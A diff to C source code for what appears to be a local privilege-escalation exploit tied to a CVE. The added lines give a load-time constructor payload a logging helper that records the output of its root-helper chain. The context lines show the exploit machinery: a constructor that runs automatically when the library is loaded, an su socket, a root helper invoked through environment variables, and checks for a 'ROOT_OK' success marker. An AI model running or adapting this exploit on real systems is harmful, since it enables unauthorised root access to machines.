@@ -1,6 +1,7 @@
 #define _GNU_SOURCE
 
 #include <errno.h>
+#include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -12,6 +13,57 @@
 #ifndef SU_SOCKET_ENV
 #define SU_SOCKET_ENV "CVE43499_SU_SOCKET"
 #endif
+
+#include <dlfcn.h>
+#include <sys/stat.h>
+
+static void a536_payload(void);
+
+static int autolog_fd = -1;
+
+static void autolog_open(void) {
+  Dl_info info;
+  char path[512];
+  char *slash;
+
+  if (autolog_fd >= 0)
+    return;
+  if (!dladdr((void *)a536_payload, &info) || !info.dli_fname)
+    return;
+  snprintf(path, sizeof(path), "%s", info.dli_fname);
+  slash = strrchr(path, '/');
+  if (!slash)
+    return;
+  *slash = 0;
+  slash = strrchr(path, '/');
+  if (!slash)
+    return;
+  *slash = 0;
+  slash = strrchr(path, '/');
+  if (!slash)
+    return;
+  slash[1] = 0;
+  strncat(path, "chain-autolog.txt", sizeof(path) - strlen(path) - 1);
+  autolog_fd = open(path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
+}
+
+static void autolog_line(const char *line) {
+  if (autolog_fd < 0)
+    return;
+  ssize_t length = (ssize_t)strlen(line);
+
+  while (length > 0) {
+    ssize_t written = write(autolog_fd, line, (size_t)length);
+
+    if (written < 0 && errno == EINTR)
+      continue;
+    if (written <= 0)
+      break;
+    line += written;
+    length -= written;
+  }
+  fsync(autolog_fd);
+}
 
 _Noreturn void a536_exploit(void);
 
@@ -108,6 +160,7 @@ __attribute__((constructor)) static void a536_payload(void) {
   started = 1;
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
+  autolog_open();
   setup_su_socket();
   root_helper = getenv("CVE43499_ROOT_HELPER");
   if (!root_helper || !*root_helper || access(root_helper, X_OK)) {
@@ -143,6 +196,7 @@ __attribute__((constructor)) static void a536_payload(void) {
          geteuid(), getpid(), chain, context);
   while (fgets(line, sizeof(line), stream)) {
     fputs(line, stdout);
+    autolog_line(line);
     if (!strncmp(line, "ROOT_OK", 7))
       root_seen = 1;
     if (root_seen && !strncmp(line, "chain ready", 11)) {
